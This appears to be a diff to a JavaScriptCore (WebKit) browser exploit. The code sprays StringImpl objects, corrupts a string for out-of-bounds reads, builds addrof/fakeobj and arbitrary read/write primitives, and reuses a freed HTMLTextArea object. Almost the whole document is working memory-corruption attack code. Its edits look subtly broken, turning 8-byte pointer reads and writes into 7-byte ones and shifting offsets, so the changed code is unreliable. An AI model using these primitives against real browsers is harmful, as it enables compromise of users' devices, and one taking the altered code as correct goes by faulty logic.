@@ -68,7 +68,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 7, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -115,7 +115,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 15; i >= 8; i--)
+	for(var i = 15; i >= 7; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -187,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 7; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -196,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 8));
+	return new Int64(read(addr, 7));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 7; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -258,7 +258,7 @@ function leakJSC() {
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
-	for (let i = arr_str.length - 2; i > 0; i--) {
+	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
@@ -326,12 +326,12 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
 					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
-					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
+					v = new Int64(str2array(g_relative_read, 7, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 8, i + 8));
+					v = new Int64(str2array(g_relative_read, 7, i + 7));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
 				g_jsview_leak = v;
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -397,7 +397,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
